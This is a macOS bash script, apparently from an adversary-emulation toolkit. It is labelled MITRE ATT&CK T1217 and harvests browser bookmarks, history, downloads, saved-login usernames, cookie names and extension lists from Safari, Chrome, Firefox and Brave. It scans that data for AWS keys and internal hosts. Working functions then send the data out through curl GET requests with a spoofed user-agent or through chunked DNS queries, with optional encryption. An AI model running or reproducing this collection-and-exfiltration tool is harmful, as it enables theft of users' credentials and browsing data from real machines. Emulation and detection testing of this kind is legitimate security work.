#!/bin/bash

# Script Name: browser_bookmarks.sh
# MITRE ATT&CK Technique: T1217 - Browser Bookmark Discovery
# Tactic: Discovery
# Platform: macOS

# Author: @darmado x.com/darmad0
# Date: $(date +%Y-%m-%d)
# Version: 1.0

# Description:
# This script discovers browser bookmarks from various browsers on macOS systems.
# It uses native macOS commands and direct database access to gather bookmark information.

# References:
# - https://attack.mitre.org/techniques/T1217/
# - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1217/T1217.md

# Global Variables
NAME="browser_bookmarks"
TACTIC="discovery"
TTP_ID="T1217"
LOG_FILE="${TTP_ID}_${NAME}.log"
USER=""

# Browser Database Paths
SAFARI_BOOKMARKS="$HOME/Library/Safari/Bookmarks.plist"
SAFARI_HISTORY="$HOME/Library/Safari/History.db"
SAFARI_DOWNLOADS="$HOME/Library/Safari/Downloads.plist"

CHROME_BOOKMARKS="$HOME/Library/Application Support/Google/Chrome/Default/Bookmarks"
CHROME_HISTORY="$HOME/Library/Application Support/Google/Chrome/Default/History"
CHROME_LOGIN_DATA="$HOME/Library/Application Support/Google/Chrome/Default/Login Data"
CHROME_COOKIES="$HOME/Library/Application Support/Google/Chrome/Default/Cookies"
CHROME_EXTENSIONS="$HOME/Library/Application Support/Google/Chrome/Default/Extensions"

FIREFOX_PROFILE=$(find ~/Library/Application\ Support/Firefox/Profiles/*.default-release -maxdepth 0 -type d 2>/dev/null | head -n 1)
FIREFOX_BOOKMARKS="${FIREFOX_PROFILE}/places.sqlite"
FIREFOX_COOKIES="${FIREFOX_PROFILE}/cookies.sqlite"
FIREFOX_LOGINS="${FIREFOX_PROFILE}/logins.json"
FIREFOX_EXTENSIONS="${FIREFOX_PROFILE}/extensions.json"

BRAVE_BOOKMARKS="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Bookmarks"
BRAVE_HISTORY="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History"
BRAVE_LOGIN_DATA="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data"
BRAVE_EXTENSIONS="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Extensions"

# Command Variables
CMD_READ_SAFARI="plutil -p"
CMD_READ_SAFARI_DB="sqlite3"
CMD_READ_CHROME="cat"
CMD_READ_CHROME_DB="sqlite3"
CMD_READ_FIREFOX="sqlite3"
CMD_READ_BRAVE="cat"
CMD_READ_BRAVE_DB="sqlite3"

# Display help message
display_help() {
    cat << 'EOF'
Usage: $0 [OPTIONS]

Description:
  Discovers browser bookmarks from various browsers on macOS systems.

Options:
  General:
    -h, --help              Display this help message
    -v, --verbose           Enable verbose output
    -a, --all              Run all browser checks

  Browser Specific:
    -s, --safari           Check Safari bookmarks
    -c, --chrome           Check Chrome bookmarks
    -f, --firefox          Check Firefox bookmarks
    -b, --brave            Check Brave bookmarks

  Output Manipulation:
    --encode=TYPE          Encode output (b64|hex|uuencode|perl_b64|perl_utf8)
    --exfil=URI           Exfiltrate output to URI using HTTP GET
    --exfil=dns=DOMAIN    Exfiltrate output via DNS queries to DOMAIN (Base64 encoded)
    --encrypt=METHOD      Encrypt output (aes|blowfish|gpg). Generates a random key.
    --log                 Enable logging of output to a file

Examples:
  $0 -a                    Check all browsers
  $0 -s -c                 Check Safari and Chrome only
  $0 -a --encode=b64       Check all browsers and encode output in base64
  $0 -f --exfil=http://example.com  Check Firefox and exfiltrate results

Note: Some browsers may require the browser to be closed for accurate results.
EOF
}

# Get current user: used for logs only
get_user() {
    USER=$(whoami)
}

# Function to get the current timestamp
get_timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

# Log command invocation
log() {
    local output="$1"
    local max_size_kb=$((5 * 1024))  # 5MB in kilobytes
    local timestamp
    timestamp=$(get_timestamp)

    # Check file size using du
    if [ -f "$LOG_FILE" ] && [ $(du -k "$LOG_FILE" | cut -f1) -ge $max_size_kb ]; then
        local base_name="${LOG_FILE%.log}"
        local rotate_count=1

        # Rotate logs inside the filename
        while [ -f "${base_name}.${rotate_count}.log" ]; do
            rotate_count=$((rotate_count + 1))
        done

        mv "$LOG_FILE" "${base_name}.${rotate_count}.log"
    fi
}

# Generate encryption key
generate_random_key() {
    openssl rand -base64 32 | tr -d '\n/'
}

# Encryption function
encrypt_data() {
    local data="$1"
    local method="$2"
    local key="$3"

    case "$method" in
        aes)
            echo "$data" | openssl enc -aes-256-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        blowfish)
            echo "$data" | openssl bf-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        gpg)
            echo "$data" | gpg --batch --yes --passphrase "$key" --symmetric --armor
            ;;
        *)
            echo "Unsupported encryption method: $method" >&2
            return 1
            ;;
    esac
}

# Initialize variables
VERBOSE=false
ALL=false
SAFARI=false
CHROME=false
FIREFOX=false
BRAVE=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""
LOG_ENABLED=false

# Parse command-line arguments
while [ "$#" -gt 0 ]; do
    case "$1" in
        -h|--help)
            display_help
            exit 0
            ;;
        -v|--verbose)
            VERBOSE=true
            ;;
        -a|--all)
            ALL=true
            ;;
        -s|--safari)
            SAFARI=true
            ;;
        -c|--chrome)
            CHROME=true
            ;;
        -f|--firefox)
            FIREFOX=true
            ;;
        -b|--brave)
            BRAVE=true
            ;;
        --encode=*)
            ENCODE="${1#*=}"
            ;;
        --exfil=*)
            EXFIL=true
            EXFIL_METHOD="${1#*=}"
            if [[ "$EXFIL_METHOD" == dns=* ]]; then
                EXFIL_METHOD="dns"
                EXFIL_URI="${1#*=dns=}"
            else
                EXFIL_METHOD="http"
                EXFIL_URI="${1#*=}"
            fi
            ;;
        --encrypt=*)
            ENCRYPT="${1#*=}"
            ENCRYPT_KEY=$(generate_random_key)
            if [ "$VERBOSE" = true ]; then
                echo "Generated encryption key: $ENCRYPT_KEY"
            fi
            ;;
        --log)
            LOG_ENABLED=true
            ;;
        *)
            echo "Invalid option: $1" >&2
            display_help
            exit 1
            ;;
    esac
    shift
done

# Encoding function
encode_output() {
    local output=$1
    case $ENCODE in
        b64)
            echo "$output" | base64
            ;;
        hex)
            echo "$output" | xxd -p
            ;;
        uuencode)
            echo "$output" | uuencode -m -
            ;;
        perl_b64)
            echo "$output" | perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'
            ;;
        perl_utf8)
            echo "$output" | perl -e 'use Encode qw(encode); print encode("utf8", join("", <STDIN>));'
            ;;
        *)
            echo "$output"
            ;;
    esac
}

# Browser-specific functions
check_safari_data() {
    local output=""
    
    # Check bookmarks
    if [ -f "$SAFARI_BOOKMARKS" ]; then
        output+="[$(get_timestamp)]: user: $USER; msg: Checking Safari bookmarks\n"
        output+="$($CMD_READ_SAFARI "$SAFARI_BOOKMARKS" 2>/dev/null)\n"
    fi
    
    # Check history
    if [ -f "$SAFARI_HISTORY" ]; then
        output+="[$(get_timestamp)]: user: $USER; msg: Checking Safari history\n"
        output+="$($CMD_READ_SAFARI_DB "$SAFARI_HISTORY" "SELECT url, title, visit_count FROM history_items" 2>/dev/null)\n"
    fi
    
    # Check downloads
    if [ -f "$SAFARI_DOWNLOADS" ]; then
        output+="[$(get_timestamp)]: user: $USER; msg: Checking Safari downloads\n"
        output+="$($CMD_READ_SAFARI "$SAFARI_DOWNLOADS" 2>/dev/null)\n"
    fi
    
    echo -e "$output"
}

check_chrome_data() {
    local output=""
    
    # Check bookmarks
    if [ -f "$CHROME_BOOKMARKS" ]; then
        output+="[$(get_timestamp)]: user: $USER; msg: Checking Chrome bookmarks\n"
        output+="$($CMD_READ_CHROME "$CHROME_BOOKMARKS" 2>/dev/null)\n"
    fi
    
    # Check history
    if [ -f "$CHROME_HISTORY" ]; then
        output+="[$(get_timestamp)]: user: $USER; msg: Checking Chrome history\n"
        output+="$($CMD_READ_CHROME_DB "$CHROME_HISTORY" "SELECT url, title, visit_count FROM urls" 2>/dev/null)\n"
    fi
    
    # Check login data
    if [ -f "$CHROME_LOGIN_DATA" ]; then
        output+="[$(get_timestamp)]: user: $USER; msg: Checking Chrome login data\n"
        output+="$($CMD_READ_CHROME_DB "$CHROME_LOGIN_DATA" "SELECT origin_url, username_value FROM logins" 2>/dev/null)\n"
    fi
    
    # Add extension analysis
    output+="$(analyze_extensions "chrome" "$CHROME_EXTENSIONS")\n"
    
    # Extract internal resources
    output+="$(extract_internal_resources "$output")\n"
    
    # Detect sensitive data
    output+="$(detect_sensitive_data "$output")\n"
    
    echo -e "$output"
}

check_firefox_data() {
    local output=""
    
    # Check bookmarks and history (stored in places.sqlite)
    if [ -f "$FIREFOX_BOOKMARKS" ]; then
        output+="[$(get_timestamp)]: user: $USER; msg: Checking Firefox bookmarks and history\n"
        output+="$($CMD_READ_FIREFOX "$FIREFOX_BOOKMARKS" "SELECT url, title, visit_count FROM moz_places" 2>/dev/null)\n"
    fi
    
    # Check cookies
    if [ -f "$FIREFOX_COOKIES" ]; then
        output+="[$(get_timestamp)]: user: $USER; msg: Checking Firefox cookies\n"
        output+="$($CMD_READ_FIREFOX "$FIREFOX_COOKIES" "SELECT host, name FROM moz_cookies" 2>/dev/null)\n"
    fi
    
    # Add extension analysis
    output+="$(analyze_extensions "firefox" "$FIREFOX_EXTENSIONS")\n"
    
    # Extract internal resources
    output+="$(extract_internal_resources "$output")\n"
    
    # Detect sensitive data
    output+="$(detect_sensitive_data "$output")\n"
    
    echo -e "$output"
}

check_brave_data() {
    local output=""
    
    # Check bookmarks
    if [ -f "$BRAVE_BOOKMARKS" ]; then
        output+="[$(get_timestamp)]: user: $USER; msg: Checking Brave bookmarks\n"
        output+="$($CMD_READ_BRAVE "$BRAVE_BOOKMARKS" 2>/dev/null)\n"
    fi
    
    # Check history
    if [ -f "$BRAVE_HISTORY" ]; then
        output+="[$(get_timestamp)]: user: $USER; msg: Checking Brave history\n"
        output+="$($CMD_READ_BRAVE_DB "$BRAVE_HISTORY" "SELECT url, title, visit_count FROM urls" 2>/dev/null)\n"
    fi
    
    # Add extension analysis
    output+="$(analyze_extensions "brave" "$BRAVE_EXTENSIONS")\n"
    
    # Extract internal resources
    output+="$(extract_internal_resources "$output")\n"
    
    # Detect sensitive data
    output+="$(detect_sensitive_data "$output")\n"
    
    echo -e "$output"
}

# Exfiltration functions
exfiltrate_http() {
    local data="$1"
    local uri="$2"
    if [ -z "$data" ]; then
        echo "No data to exfiltrate" >&2
        return 1
    fi
    if [ "$ENCRYPT" != "none" ]; then
        data=$(encrypt_data "$data" "$ENCRYPT" "$ENCRYPT_KEY")
        encoded_key=$(echo "$ENCRYPT_KEY" | base64 | tr '+/' '-_' | tr -d '=')
    fi
    encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    
    # Determine if we're using HTTPS
    if [[ "$uri" == https://* ]]; then
        curl_opts="--insecure"
    else
        curl_opts=""
    fi
    
    local full_uri="$uri?d=$encoded_data"
    if [ "$ENCRYPT" != "none" ]; then
        full_uri="${full_uri}&_k=$encoded_key"
    fi
    
    if [ "$VERBOSE" = true ]; then
        echo "Exfiltrating data to $uri"
        curl -v $curl_opts -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri"
    else
        curl -s $curl_opts -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri" > /dev/null 2>&1
    fi
}

exfiltrate_dns() {
    local data=$1
    local domain=$2
    local id=$3
    local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
    local chunk_size=63  # Max length of a DNS label

    # Send the ID first
    dig +short "${encoded_id}.id.$domain" A > /dev/null

    # Then send the data in chunks
    local i=0
    while [ -n "$encoded_data" ]; do
        chunk="${encoded_data:0:$chunk_size}"
        encoded_data="${encoded_data:$chunk_size}"
        dig +short "${chunk}.${i}.$domain" A > /dev/null
        i=$((i+1))
    done
    # Send a final chunk to indicate end of transmission
    dig +short "end.$domain" A > /dev/null
}

# Logging functions
create_log() {
    local script_name=$(basename "$0" .sh)
    touch "$LOG_FILE"
}

log_output() {
    local output="$1"
    local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
    
    if [ ! -f "$LOG_FILE" ] || [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        create_log
    fi
    
    echo "$output" >> "$LOG_FILE"
    
    # Rotate log if it exceeds 5MB
    if [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        mv "$LOG_FILE" "${LOG_FILE}.old"
        create_log
    fi
}

# Function to log output
log_and_append() {
    local result="$1"
    
    # Only log if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        echo "$result" >> "$LOG_FILE"
    fi
}

# Function to extract internal resources
extract_internal_resources() {
    local data="$1"
    local output=""
    
    # Common internal domain patterns
    local patterns=(
        "internal\." "intranet\." "corp\." "corporate\."
        "\.local" "\.internal" "\.intranet" "\.corp"
        "192\.168\." "10\." "172\.(1[6-9]|2[0-9]|3[0-1])\."
    )
    
    for pattern in "${patterns[@]}"; do
        local matches
        matches=$(echo "$data" | grep -E "$pattern" 2>/dev/null)
        if [ -n "$matches" ]; then
            output+="[$(get_timestamp)]: Found internal resources matching $pattern:\n$matches\n"
        fi
    done
    
    echo -e "$output"
}

# Function to analyze browser extensions
analyze_extensions() {
    local browser="$1"
    local ext_path="$2"
    local output=""
    
    case "$browser" in
        "chrome")
            if [ -d "$ext_path" ]; then
                output+="[$(get_timestamp)]: Chrome extensions found:\n"
                output+="$(find "$ext_path" -type f -name "manifest.json" -exec grep -H "\"name\":" {} \; 2>/dev/null)\n"
            fi
            ;;
        "firefox")
            if [ -f "$ext_path" ]; then
                output+="[$(get_timestamp)]: Firefox extensions found:\n"
                output+="$(cat "$ext_path" 2>/dev/null | grep -E "\"name\":|\"id\":" )\n"
            fi
            ;;
        "brave")
            if [ -d "$ext_path" ]; then
                output+="[$(get_timestamp)]: Brave extensions found:\n"
                output+="$(find "$ext_path" -type f -name "manifest.json" -exec grep -H "\"name\":" {} \; 2>/dev/null)\n"
            fi
            ;;
    esac
    
    echo -e "$output"
}

# Function to detect sensitive data patterns
detect_sensitive_data() {
    local data="$1"
    local output=""
    
    # Patterns for sensitive data
    local patterns=(
        # AWS Keys
        "AKIA[0-9A-Z]{16}"
        # Internal IPs
        "\b10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\b"
        # Common internal domains
        "\.internal\.[a-zA-Z]+\b"
        "\.corp\.[a-zA-Z]+\b"
        # Development environments
        "dev\.|staging\.|test\."
        # Common internal tools
        "jenkins\.|jira\.|confluence\.|gitlab\.|artifactory\."
    )
    
    for pattern in "${patterns[@]}"; do
        local matches
        matches=$(echo "$data" | grep -E "$pattern" 2>/dev/null)
        if [ -n "$matches" ]; then
            output+="[$(get_timestamp)]: Found sensitive data matching $pattern:\n$matches\n"
        fi
    done
    
    echo -e "$output"
}

# Main function
main() {
    local output=""          # Variable to hold unencoded output
    local encoded_output=""  # Variable to hold encoded output

    # Setup logging if enabled
    if [ "$LOG_ENABLED" = true ]; then
        create_log
    fi

    # Run the get_user function to set the USER global variable
    get_user

    # Handle all the browser checks and capture output
    if [ "$ALL" = true ] || [ "$SAFARI" = true ]; then
        output+="$(check_safari_data)\n"
    fi

    if [ "$ALL" = true ] || [ "$CHROME" = true ]; then
        output+="$(check_chrome_data)\n"
    fi

    if [ "$ALL" = true ] || [ "$FIREFOX" = true ]; then
        output+="$(check_firefox_data)\n"
    fi

    if [ "$ALL" = true ] || [ "$BRAVE" = true ]; then
        output+="$(check_brave_data)\n"
    fi

    # Handle output processing
    if [ "$LOG_ENABLED" = true ]; then
        if [ "$ENCODE" != "none" ]; then
            encoded_output=$(encode_output "$output")
            log_and_append "[$(get_timestamp)]: $encoded_output"
        else
            log_and_append "$output"
        fi
    else
        if [ "$ENCODE" != "none" ]; then
            encoded_output=$(encode_output "$output")
            echo -e "$encoded_output"
        else
            echo -e "$output"
        fi
    fi

    # Handle exfiltration if enabled
    if [ "$EXFIL" = true ]; then
        local data_to_exfil
        if [ "$ENCODE" != "none" ]; then
            data_to_exfil="$encoded_output"
        else
            data_to_exfil="$output"
        fi

        case "$EXFIL_METHOD" in
            http)
                exfiltrate_http "$data_to_exfil" "$EXFIL_URI"
                ;;
            dns)
                exfiltrate_dns "$data_to_exfil" "$EXFIL_URI" "bookmarks"
                ;;
        esac
    fi
}

# Run main function
main 